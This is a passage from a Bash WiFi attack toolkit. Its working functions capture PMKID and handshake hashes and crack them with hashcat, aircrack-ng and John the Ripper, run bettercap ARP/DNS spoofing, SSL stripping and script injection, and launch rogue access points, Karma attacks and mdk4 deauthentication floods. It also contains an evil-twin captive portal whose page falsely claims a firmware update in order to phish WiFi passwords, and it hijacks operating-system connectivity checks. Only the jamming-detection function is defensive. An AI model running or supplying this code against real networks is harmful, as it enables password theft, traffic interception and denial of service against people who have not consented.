        pause
        return
    fi

    local timestamp=$(get_timestamp)
    local capture_file="$LOGS_DIR/captures/pmkid_${timestamp}.pcapng"
    mkdir -p "$LOGS_DIR/captures"

    echo -e "${YELLOW}[*] Starting PMKID capture on $interface${NC}"
    echo -e "${YELLOW}[*] This attack does NOT require connected clients${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop capture${NC}"
    echo ""

    read -p "Enter target BSSID (or leave empty for all): " target_bssid

    if [[ -n "$target_bssid" ]]; then
        local filter_file=$(mktemp)
        echo "$target_bssid" | tr -d ':' > "$filter_file"
        hcxdumptool -i "$interface" -o "$capture_file" --filterlist_ap="$filter_file" --filtermode=2
        rm -f "$filter_file"
    else
        hcxdumptool -i "$interface" -o "$capture_file" --enable_status=1
    fi

    if [[ -f "$capture_file" ]]; then
        local hash_file="$LOGS_DIR/captures/pmkid_${timestamp}.hc22000"
        hcxpcapngtool "$capture_file" -o "$hash_file" 2>/dev/null

        if [[ -s "$hash_file" ]]; then
            local count=$(wc -l < "$hash_file")
            success "Captured $count PMKID hash(es)!"
            echo -e "${WHITE}Hash file: $hash_file${NC}"
            echo -e "${YELLOW}[*] Crack with: hashcat -m 22000 $hash_file <wordlist>${NC}"
        else
            warning "No PMKID hashes extracted from capture"
        fi
    fi

    pause
}

# Verify handshake file
verify_handshake() {
    clear
    echo -e "${BLUE}Verify Handshake${NC}"
    echo -e "${GRAY}================${NC}"

    echo -e "${WHITE}Handshake files in captures directory:${NC}"
    echo ""
    local cap_files=()
    local i=0
    for f in "$LOGS_DIR/captures"/*.cap "$LOGS_DIR/captures"/*-clean.cap; do
        [[ -f "$f" ]] || continue
        i=$((i + 1))
        cap_files+=("$f")
        local size=$(get_file_size "$f")
        echo -e "${CYAN}[$i]${NC} $(basename "$f") ${GRAY}($size)${NC}"
    done

    if [[ $i -eq 0 ]]; then
        echo -e "${YELLOW}[!] No capture files found${NC}"
        echo -e "${YELLOW}[!] Capture a handshake first (option 1)${NC}"
        pause
        return
    fi

    echo ""
    read -p "Select file (1-$i) or enter path: " selection

    local cap_file=""
    if [[ "$selection" =~ ^[0-9]+$ && $selection -ge 1 && $selection -le $i ]]; then
        cap_file="${cap_files[$((selection - 1))]}"
    elif [[ -f "$selection" ]]; then
        cap_file="$selection"
    else
        echo -e "${RED}[!] Invalid selection${NC}"
        pause
        return
    fi

    echo -e "${YELLOW}[*] Verifying: $(basename "$cap_file")${NC}"
    echo ""

    local result=$(aircrack-ng "$cap_file" 2>&1)
    echo "$result"
    echo ""

    if echo "$result" | grep -q "1 handshake"; then
        success "Valid handshake found!"
    elif echo "$result" | grep -q "No networks found"; then
        warning "No handshake in this file"
    else
        warning "Handshake verification inconclusive"
    fi

    pause
}

# Crack with aircrack-ng
crack_aircrack() {
    clear
    echo -e "${BLUE}Crack with Aircrack-ng${NC}"
    echo -e "${GRAY}======================${NC}"

    read -p "Enter path to capture file (.cap): " cap_file
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    if [[ ! -f "$wordlist" ]]; then
        if [[ -f "${wordlist}.gz" ]]; then
            echo -e "${YELLOW}[*] Decompressing wordlist...${NC}"
            gunzip -k "${wordlist}.gz"
        else
            echo -e "${RED}[!] Wordlist not found: $wordlist${NC}"
            pause
            return
        fi
    fi

    echo -e "${YELLOW}[*] Starting aircrack-ng...${NC}"
    echo -e "${YELLOW}[*] Capture: $cap_file${NC}"
    echo -e "${YELLOW}[*] Wordlist: $wordlist${NC}"
    echo ""

    aircrack-ng -w "$wordlist" "$cap_file"

    pause
}

# Crack with hashcat
crack_hashcat() {
    clear
    echo -e "${BLUE}Crack with Hashcat (GPU)${NC}"
    echo -e "${GRAY}========================${NC}"

    if ! command -v hashcat &>/dev/null; then
        echo -e "${RED}[!] hashcat not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hashcat${NC}"
        pause
        return
    fi

    echo -e "${WHITE}Input format:${NC}"
    echo -e "${CYAN}[1]${NC} .hc22000 file (WPA-PBKDF2-PMKID+EAPOL)"
    echo -e "${CYAN}[2]${NC} .cap file (auto-convert)"
    echo ""

    read -p "Select format: " format_choice
    local hash_file=""

    case $format_choice in
        1)
            read -p "Enter path to .hc22000 file: " hash_file
            ;;
        2)
            read -p "Enter path to .cap file: " cap_file
            if [[ -f "$cap_file" ]]; then
                hash_file="${cap_file%.cap}.hc22000"
                if command -v hcxpcapngtool &>/dev/null; then
                    hcxpcapngtool "$cap_file" -o "$hash_file" 2>/dev/null
                elif command -v cap2hccapx &>/dev/null; then
                    local hccapx="${cap_file%.cap}.hccapx"
                    cap2hccapx "$cap_file" "$hccapx"
                    hash_file="$hccapx"
                else
                    echo -e "${RED}[!] No conversion tool found (need hcxtools)${NC}"
                    pause
                    return
                fi
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            pause
            return
            ;;
    esac

    if [[ ! -f "$hash_file" ]]; then
        echo -e "${RED}[!] Hash file not found${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo ""
    echo -e "${WHITE}Attack mode:${NC}"
    echo -e "${CYAN}[1]${NC} Dictionary attack"
    echo -e "${CYAN}[2]${NC} Dictionary + rules"
    echo -e "${CYAN}[3]${NC} Brute force (mask)"
    echo -e "${CYAN}[4]${NC} Combinator attack"
    echo ""

    read -p "Select mode: " attack_mode

    local hash_mode="22000"
    [[ "$hash_file" == *.hccapx ]] && hash_mode="2500"

    case $attack_mode in
        1)
            echo -e "${YELLOW}[*] Starting hashcat dictionary attack...${NC}"
            hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" --status --status-timer=10
            ;;
        2)
            echo -e "${WHITE}Rule files:${NC}"
            echo -e "${CYAN}[1]${NC} best64.rule (fast)"
            echo -e "${CYAN}[2]${NC} rockyou-30000.rule (thorough)"
            echo -e "${CYAN}[3]${NC} dive.rule (comprehensive)"
            echo -e "${CYAN}[4]${NC} Custom rule file"
            echo ""
            read -p "Select rule: " rule_choice

            local rule_file=""
            case $rule_choice in
                1) rule_file="/usr/share/hashcat/rules/best64.rule" ;;
                2) rule_file="/usr/share/hashcat/rules/rockyou-30000.rule" ;;
                3) rule_file="/usr/share/hashcat/rules/dive.rule" ;;
                4) read -p "Enter rule file path: " rule_file ;;
            esac

            if [[ -f "$rule_file" ]]; then
                hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" -r "$rule_file" --status --status-timer=10
            else
                echo -e "${RED}[!] Rule file not found${NC}"
            fi
            ;;
        3)
            echo -e "${WHITE}Common masks:${NC}"
            echo -e "${CYAN}[1]${NC} ?d?d?d?d?d?d?d?d        (8-digit numbers)"
            echo -e "${CYAN}[2]${NC} ?l?l?l?l?l?l?l?l        (8 lowercase)"
            echo -e "${CYAN}[3]${NC} ?u?l?l?l?l?l?d?d        (Name + 2 digits)"
            echo -e "${CYAN}[4]${NC} Custom mask"
            echo ""
            read -p "Select mask: " mask_choice

            local mask=""
            case $mask_choice in
                1) mask="?d?d?d?d?d?d?d?d" ;;
                2) mask="?l?l?l?l?l?l?l?l" ;;
                3) mask="?u?l?l?l?l?l?d?d" ;;
                4) read -p "Enter mask: " mask ;;
            esac

            if [[ -n "$mask" ]]; then
                hashcat -m "$hash_mode" -a 3 "$hash_file" "$mask" --status --status-timer=10
            fi
            ;;
        4)
            read -p "Enter second wordlist: " wordlist2
            if [[ -f "$wordlist2" ]]; then
                hashcat -m "$hash_mode" -a 1 "$hash_file" "$wordlist" "$wordlist2" --status --status-timer=10
            else
                echo -e "${RED}[!] Second wordlist not found${NC}"
            fi
            ;;
    esac

    pause
}

# Crack with John the Ripper
crack_john() {
    clear
    echo -e "${BLUE}Crack with John the Ripper${NC}"
    echo -e "${GRAY}==========================${NC}"

    if ! command -v john &>/dev/null; then
        echo -e "${RED}[!] John the Ripper not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install john${NC}"
        pause
        return
    fi

    read -p "Enter path to capture file (.cap): " cap_file
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    # Convert to john format
    local john_file="${cap_file%.cap}.john"
    if command -v wpapcap2john &>/dev/null; then
        wpapcap2john "$cap_file" > "$john_file" 2>/dev/null
    elif command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool "$cap_file" -o "${cap_file%.cap}.hc22000" 2>/dev/null
        john_file="${cap_file%.cap}.hc22000"
    else
        echo -e "${RED}[!] No conversion tool available${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo -e "${YELLOW}[*] Starting John the Ripper...${NC}"
    john --wordlist="$wordlist" "$john_file"

    echo ""
    echo -e "${YELLOW}[*] Results:${NC}"
    john --show "$john_file"

    pause
}

# Convert handshake formats
convert_handshake() {
    clear
    echo -e "${BLUE}Convert Handshake Format${NC}"
    echo -e "${GRAY}========================${NC}"

    read -p "Enter path to capture file: " input_file
    if [[ ! -f "$input_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    echo ""
    echo -e "${WHITE}Convert to:${NC}"
    echo -e "${CYAN}[1]${NC} .hc22000 (hashcat WPA)"
    echo -e "${CYAN}[2]${NC} .hccapx (hashcat legacy)"
    echo -e "${CYAN}[3]${NC} Clean .cap (wpaclean)"
    echo ""

    read -p "Select format: " choice

    case $choice in
        1)
            local output="${input_file%.*}.hc22000"
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool "$input_file" -o "$output" 2>/dev/null
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion produced empty output"
            else
                echo -e "${RED}[!] hcxpcapngtool not found (install hcxtools)${NC}"
            fi
            ;;
        2)
            local output="${input_file%.*}.hccapx"
            if command -v cap2hccapx &>/dev/null; then
                cap2hccapx "$input_file" "$output"
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion failed"
            else
                echo -e "${RED}[!] cap2hccapx not found (install hcxtools)${NC}"
            fi
            ;;
        3)
            local output="${input_file%.*}-clean.cap"
            wpaclean "$output" "$input_file" 2>/dev/null
            [[ -s "$output" ]] && success "Cleaned to: $output" || warning "Cleaning failed"
            ;;
    esac

    pause
}

# Manage wordlists
manage_wordlists() {
    clear
    echo -e "${BLUE}Wordlist Manager${NC}"
    echo -e "${GRAY}================${NC}"

    echo -e "${WHITE}Wordlist Options:${NC}"
    echo -e "${CYAN}[1]${NC} List available wordlists"
    echo -e "${CYAN}[2]${NC} Decompress rockyou.txt.gz"
    echo -e "${CYAN}[3]${NC} Generate custom wordlist (crunch)"
    echo -e "${CYAN}[4]${NC} Merge wordlists"
    echo -e "${CYAN}[5]${NC} Sort and deduplicate wordlist"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo ""
            echo -e "${WHITE}System wordlists:${NC}"
            for wl in /usr/share/wordlists/*; do
                [[ -e "$wl" ]] || continue
                echo -e "  ${CYAN}$(basename "$wl")${NC} ${GRAY}($(get_file_size "$wl"))${NC}"
            done
            echo ""
            echo -e "${WHITE}SecLists (if installed):${NC}"
            if [[ -d "/usr/share/seclists" ]]; then
                ls /usr/share/seclists/Passwords/ 2>/dev/null | head -10
                echo -e "${GRAY}  ...and more${NC}"
            else
                echo -e "${YELLOW}  [!] Not installed. Install with: sudo apt install seclists${NC}"
            fi
            ;;
        2)
            if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
                echo -e "${YELLOW}[*] Decompressing rockyou.txt.gz...${NC}"
                gunzip -k /usr/share/wordlists/rockyou.txt.gz
                success "Decompressed to /usr/share/wordlists/rockyou.txt"
            elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
                echo -e "${GREEN}[✓] rockyou.txt already decompressed${NC}"
            else
                echo -e "${RED}[!] rockyou.txt not found${NC}"
            fi
            ;;
        3)
            if ! command -v crunch &>/dev/null; then
                echo -e "${RED}[!] crunch not found. Install with: sudo apt install crunch${NC}"
            else
                read -p "Min length: " min_len
                read -p "Max length: " max_len
                read -p "Character set [abcdefghijklmnopqrstuvwxyz0123456789]: " charset
                charset="${charset:-abcdefghijklmnopqrstuvwxyz0123456789}"
                read -p "Output file: " output_file

                echo -e "${YELLOW}[*] Generating wordlist...${NC}"
                crunch "$min_len" "$max_len" "$charset" -o "$output_file"
                [[ -f "$output_file" ]] && success "Wordlist saved to $output_file"
            fi
            ;;
        4)
            read -p "Enter wordlist paths (space-separated): " -a lists
            read -p "Output file: " output_file
            cat "${lists[@]}" 2>/dev/null | sort -u > "$output_file"
            [[ -s "$output_file" ]] && success "Merged $(wc -l < "$output_file") unique words to $output_file"
            ;;
        5)
            read -p "Enter wordlist path: " wl_file
            if [[ -f "$wl_file" ]]; then
                local before=$(wc -l < "$wl_file")
                sort -u "$wl_file" -o "$wl_file"
                local after=$(wc -l < "$wl_file")
                success "Deduplicated: $before -> $after entries (removed $((before - after)) duplicates)"
            fi
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════
# Advanced Attacks Menu (Main Menu Option 7)
# ══════════════════════════════════════════════════════════════

advanced_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}                  ADVANCED ATTACKS                       ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} WPS PIN Recovery          ${GRAY}Reaver / Bully attacks${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Deauthentication          ${GRAY}Targeted / broadcast${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} MITM Attack               ${GRAY}Man-in-the-middle setup${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Rogue Access Point        ${GRAY}Fake AP with hostapd${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} Karma Attack              ${GRAY}Auto-respond to probes${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Jamming Detection         ${GRAY}Detect WiFi jammers${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Channel Hopping DoS       ${GRAY}Multi-channel deauth${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) wps_attacks ;;
            2) dos_attacks ;;
            3) mitm_attack ;;
            4) rogue_ap ;;
            5) karma_attack ;;
            6) jamming_detection ;;
            7) channel_hop_dos ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# MITM attack setup
mitm_attack() {
    clear
    echo -e "${BLUE}Man-in-the-Middle Attack${NC}"
    echo -e "${GRAY}========================${NC}"

    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
        pause
        return
    fi

    echo -e "${WHITE}MITM Options:${NC}"
    echo -e "${CYAN}[1]${NC} ARP spoofing + sniffing"
    echo -e "${CYAN}[2]${NC} DNS spoofing"
    echo -e "${CYAN}[3]${NC} SSL stripping"
    echo -e "${CYAN}[4]${NC} Packet injection"
    echo ""

    read -p "Select option: " choice

    # Get internet interface
    local iface=$(get_internet_interface)

    if [[ -z "$iface" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        iface=$(select_internet_interface)

        if [[ -z "$iface" ]]; then
            error "No internet interface selected. MITM attacks require internet connectivity."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $iface${NC}"
    echo ""

    case $choice in
        1)
            echo -e "${YELLOW}[*] Starting ARP spoof + network sniffing...${NC}"
            echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set arp.spoof.fullduplex true; arp.spoof on"
            ;;
        2)
            read -p "Enter domain to spoof: " target_domain
            read -p "Redirect to IP: " redirect_ip
            echo -e "${YELLOW}[*] Starting DNS spoof for $target_domain -> $redirect_ip${NC}"
            bettercap -iface "$iface" -eval "set dns.spoof.domains $target_domain; set dns.spoof.address $redirect_ip; dns.spoof on; arp.spoof on"
            ;;
        3)
            echo -e "${YELLOW}[*] Starting SSL strip attack...${NC}"
            echo -e "${RED}[!] Many modern sites use HSTS - effectiveness varies${NC}"
            bettercap -iface "$iface" -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on; net.sniff on"
            ;;
        4)
            echo -e "${YELLOW}[*] Starting packet injection mode...${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set http.proxy.injectjs alert('injected'); http.proxy on; arp.spoof on"
            ;;
    esac

    pause
}

# Rogue access point
rogue_ap() {
    clear
    echo -e "${BLUE}Rogue Access Point${NC}"
    echo -e "${GRAY}==================${NC}"

    if ! command -v hostapd &>/dev/null; then
        echo -e "${RED}[!] hostapd not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hostapd${NC}"
        pause
        return
    fi

    local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi

    # Get internet interface for NAT
    local internet=$(get_internet_interface)

    if [[ -z "$internet" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        internet=$(select_internet_interface)

        if [[ -z "$internet" ]]; then
            error "No internet interface selected. Rogue AP requires internet for NAT."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $internet${NC}"
    echo ""

    read -p "SSID for rogue AP: " rogue_ssid
    read -p "Channel [6]: " rogue_channel
    rogue_channel="${rogue_channel:-6}"

    echo -e "${WHITE}Authentication:${NC}"
    echo -e "${CYAN}[1]${NC} Open (no password)"
    echo -e "${CYAN}[2]${NC} WPA2 with password"
    echo ""
    read -p "Select: " auth_choice

    local temp_dir=$(create_temp_dir)
    local hostapd_conf="$temp_dir/hostapd.conf"

    cat > "$hostapd_conf" << EOF
interface=$interface
driver=nl80211
ssid=$rogue_ssid
hw_mode=g
channel=$rogue_channel
wmm_enabled=0
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

    if [[ "$auth_choice" == "2" ]]; then
        read -p "WPA2 password (8+ chars): " rogue_pass
        cat >> "$hostapd_conf" << EOF
auth_algs=1
wpa=2
wpa_passphrase=$rogue_pass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    fi

    # Configure DHCP
    local dnsmasq_conf="$temp_dir/dnsmasq.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

    echo -e "${YELLOW}[*] Starting rogue AP: $rogue_ssid${NC}"

    # Configure interface
    ifconfig "$interface" 10.0.0.1 netmask 255.255.255.0 up

    # Enable IP forwarding and NAT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$internet" -j MASQUERADE
    iptables -A FORWARD -i "$interface" -o "$internet" -j ACCEPT

    # Start services
    dnsmasq -C "$dnsmasq_conf" &
    local dnsmasq_pid=$!

    hostapd "$hostapd_conf"

    # Cleanup
    kill $dnsmasq_pid 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -D POSTROUTING -o "$internet" -j MASQUERADE 2>/dev/null
    iptables -D FORWARD -i "$interface" -o "$internet" -j ACCEPT 2>/dev/null
    clean_temp_dir "$temp_dir"

    pause
}

# Karma attack
karma_attack() {
    clear
    echo -e "${BLUE}Karma Attack${NC}"
    echo -e "${GRAY}============${NC}"

    echo -e "${WHITE}Karma responds to ALL probe requests, creating matching APs${NC}"
    echo -e "${YELLOW}[!] Devices will auto-connect to remembered networks${NC}"
    echo ""

    if command -v bettercap &>/dev/null; then
        local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi
        echo -e "${YELLOW}[*] Starting Karma attack on $interface...${NC}"
        echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
        bettercap -iface "$interface" -eval "set wifi.ap.open true; wifi.recon on; wifi.ap"
    else
        echo -e "${RED}[!] bettercap required for Karma attack${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
    fi

    pause
}

# Jamming detection
jamming_detection() {
    clear
    echo -e "${BLUE}WiFi Jamming Detection${NC}"
    echo -e "${GRAY}======================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    echo -e "${YELLOW}[*] Monitoring for jamming activity on $interface${NC}"
    echo -e "${YELLOW}[*] Watching for unusual deauth/disassoc frame rates${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    echo ""

    # Monitor deauth frames
    tcpdump -i "$interface" -e -c 500 'type mgt subtype deauth or type mgt subtype disassoc' 2>/dev/null | \
    while read -r line; do
        echo -e "${RED}[DEAUTH]${NC} $line"
    done

    pause
}

# Channel hopping DoS
channel_hop_dos() {
    clear
    echo -e "${BLUE}Channel Hopping DoS${NC}"
    echo -e "${GRAY}===================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    if ! command -v mdk4 &>/dev/null; then
        echo -e "${RED}[!] mdk4 not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install mdk4${NC}"
        pause
        return
    fi

    read -p "Enter target BSSID: " target_bssid
    read -p "Channels to attack (comma-separated, e.g. 1,6,11): " channels

    echo -e "${YELLOW}[*] Starting multi-channel deauth...${NC}"
    echo -e "${YELLOW}[*] Target: $target_bssid${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"

    if [[ -n "$target_bssid" ]]; then
        local target_file=$(mktemp)
        echo "$target_bssid" > "$target_file"
        mdk4 "$interface" d -b "$target_file" -c "${channels//,/ }"
        rm -f "$target_file"
    else
        mdk4 "$interface" d -c "${channels//,/ }"
    fi

    pause
}

# ══════════════════════════════════════════════════════════════
# Evil Twin Infrastructure (used by captive-portal.sh)
# ══════════════════════════════════════════════════════════════

# Create basic captive portal HTML
create_basic_portal() {
    local portal_dir="$1"
    local ssid="$2"

    cat > "$portal_dir/index.html" << PORTALEOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${ssid} - Network Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: #16213e; border-radius: 20px; box-shadow: 0 25px 80px rgba(0,0,0,0.5); max-width: 400px; width: 100%; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }
        .header { padding: 40px 30px 25px; text-align: center; }
        .lock-icon { width: 70px; height: 70px; background: rgba(233,69,96,0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .lock-icon svg { color: #e94560; }
        .wifi-name { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 6px; word-break: break-all; }
        .notice { background: rgba(233,69,96,0.1); border: 1px solid rgba(233,69,96,0.2); border-radius: 10px; padding: 14px 18px; margin: 0 30px 5px; }
        .notice p { color: #e94560; font-size: 13px; font-weight: 500; line-height: 1.4; text-align: center; }
        .form-area { padding: 25px 30px 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: 500; color: #a2a8d3; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
        input[type="password"] { width: 100%; padding: 14px 16px; background: #0f3460; border: 2px solid rgba(255,255,255,0.08); border-radius: 10px; font-size: 16px; color: #fff; transition: all 0.3s; }
        input[type="password"]:focus { outline: none; border-color: #e94560; box-shadow: 0 0 0 3px rgba(233,69,96,0.15); }
        input[type="password"]::placeholder { color: #4a5568; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #e94560, #c23152); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; letter-spacing: 0.3px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(233,69,96,0.4); }
        .btn:active { transform: translateY(0); }
        .info { padding: 15px 30px 20px; text-align: center; }
        .info p { font-size: 11px; color: #4a5568; line-height: 1.5; }
        .router-info { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); }
        .router-info svg { color: #4a5568; }
        .router-info span { font-size: 11px; color: #4a5568; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lock-icon">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>
            <div class="wifi-name">${ssid}</div>
        </div>
        <div class="notice">
            <p>Your router requires re-authentication due to a firmware update. Please enter your WiFi password to reconnect.</p>
        </div>
        <form method="POST" action="/" class="form-area">
            <div class="form-group">
                <label for="password">WiFi Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required autocomplete="off" minlength="8">
            </div>
            <button type="submit" class="btn">Reconnect</button>
        </form>
        <div class="info">
            <p>This is a secure network authentication page. Your password is encrypted and used only to restore your connection.</p>
        </div>
        <div class="router-info">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
                <circle cx="12" cy="20" r="1"></circle>
            </svg>
            <span>Network Authentication Service</span>
        </div>
    </div>
</body>
</html>
PORTALEOF
}

# Start Evil Twin attack infrastructure
start_evil_twin_attack() {
    local interface="$1"
    local monitor_interface="$2"
    local target_bssid="$3"
    local target_channel="$4"
    local target_essid="$5"
    local portal_dir="$6"

    local temp_dir=$(create_temp_dir)

    # hostapd config - open network for captive portal
    cat > "$temp_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=$target_channel
beacon_int=100
dtim_period=2
max_num_sta=255
macaddr_acl=0
auth_algs=1
wmm_enabled=1
ieee80211n=1
ignore_broadcast_ssid=0
disassoc_low_ack=1
EOF

    # dnsmasq config - provide DHCP and DNS with internet access
    cat > "$temp_dir/dnsmasq.conf" << EOF
interface=$interface
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

# Forward all DNS to Google DNS for real internet access
server=8.8.8.8
server=8.8.4.4

# Redirect captive portal detection URLs to our portal
# Android
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/connectivitycheck.android.com/10.0.0.1
address=/clients3.google.com/10.0.0.1
address=/play.googleapis.com/10.0.0.1
# iOS / macOS
address=/captive.apple.com/10.0.0.1
address=/www.apple.com/10.0.0.1
address=/www.itools.info/10.0.0.1
address=/www.ibook.info/10.0.0.1
address=/www.airport.us/10.0.0.1
address=/www.thinkdifferent.us/10.0.0.1
# Windows
address=/www.msftconnecttest.com/10.0.0.1
address=/www.msftncsi.com/10.0.0.1
address=/ipv4.msftconnecttest.com/10.0.0.1
# Firefox
address=/detectportal.firefox.com/10.0.0.1

# Logging
log-queries
log-dhcp
log-facility=$temp_dir/dnsmasq.log
EOF

    # Kill any existing processes that might interfere
    pkill -f "dnsmasq" 2>/dev/null
    pkill -f "hostapd" 2>/dev/null
    pkill -f "lighttpd" 2>/dev/null
    pkill -f "capture_server" 2>/dev/null
    sleep 2

    # Ensure interface is up - hostapd will manage it further
    ip link set "$interface" up 2>/dev/null
    sleep 1

    # Set up internet connectivity (NAT)
    echo -e "${YELLOW}[*] Setting up internet connectivity...${NC}"
    echo -e "${WHITE}The rogue AP needs an internet source to forward victim traffic.${NC}"
    echo ""

    # Show all available interfaces with status
    echo -e "${WHITE}Available internet interfaces:${NC}"
    echo -e "${GRAY}────────────────────────────────────────────────────${NC}"
    local inet_count=0
    local inet_ifaces=()
    local default_iface=$(ip route 2>/dev/null | grep "^default" | head -1 | awk '{print $5}')

    for iface in $(ip -o link show | awk -F': ' '{print $2}' | grep -v "^lo$" | grep -v "^$monitor_interface$" | grep -v "^$interface$"); do
